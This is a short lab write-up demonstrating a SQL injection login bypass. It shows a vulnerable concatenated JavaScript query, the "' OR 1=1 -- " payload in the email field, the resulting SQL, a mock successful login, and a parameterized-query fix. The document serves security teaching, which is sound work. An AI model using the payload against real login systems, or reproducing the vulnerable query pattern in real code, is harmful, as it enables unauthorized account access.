# SQL Injection Lab 1 — Login Bypass

## Vulnerable Endpoint

POST /api/sqli/login

---

## Vulnerable Query

```javascript
const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
```

---

## SQL Injection Payload

```json
{
  "email": "' OR 1=1 -- ",
  "password": "anything"
}
```

---

## Generated SQL Query

```sql
SELECT * FROM users WHERE email = '' OR 1=1 -- ' AND password = 'anything'
```

---

## Successful Response

```json
{
  "message": "Login successful (Vulnerable Lab)",
  "user": {
    "id": 1,
    "username": "albin",
    "email": "albin@test.com"
  }
}
```

---

## Impact

- Authentication bypass
- Unauthorized account access
- User impersonation
- Database exposure risk

---

## Root Cause

User input is directly concatenated into the SQL query.

Unsafe code:

```javascript
WHERE email = '${email}'
```

---

## Secure Fix

Use parameterized queries:

```javascript
const query = "SELECT * FROM users WHERE email = $1 AND password = $2";
```

---

## Security Lesson

Never directly inject user-controlled input into SQL queries.

Always use:
- parameterized queries
- prepared statements
- ORM protections